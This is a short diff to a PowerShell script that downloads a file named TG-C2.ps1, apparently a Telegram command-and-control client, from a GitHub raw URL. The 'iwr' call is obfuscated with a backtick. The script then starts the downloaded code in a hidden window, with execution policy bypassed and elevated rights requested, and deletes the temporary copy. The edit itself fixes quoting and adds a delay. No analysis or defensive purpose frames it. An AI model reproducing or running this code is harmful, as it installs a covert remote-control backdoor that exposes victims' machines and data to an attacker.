@@ -514,7 +514,8 @@ if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
         i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
-    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"`$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
+    Sleep 1
     rm -path "$env:TEMP\temp.ps1" -Force
     }
 }
